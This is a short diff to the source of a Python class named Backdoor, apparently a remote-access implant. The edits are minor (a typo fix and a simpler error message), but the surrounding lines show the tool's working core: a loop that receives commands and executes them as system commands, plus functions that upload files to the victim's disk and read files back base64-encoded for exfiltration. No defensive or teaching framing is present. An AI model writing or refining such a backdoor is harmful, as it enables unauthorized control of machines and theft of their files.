@@ -37,13 +37,14 @@ class Backdoor:
     def write_file(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
-            return "[+] Upload Succesful"
+            return "[+] Upload Successful"
 
     def read_file(self, path):
         with open(path, "rb") as file:
             return base64.b64encode(file.read())
 
     def run(self):
+
         while True:
             command = self.reliable_receive()
 
@@ -61,8 +62,8 @@ class Backdoor:
                 else:
                     command_result = self.execute_system_command(command).decode()
 
-            except Exception as e:
-                command_result = f"[-] Error during command execution: {e}"
+            except Exception:
+                command_result = "[-] Error during command execution"
 
             self.reliable_send(command_result)
 
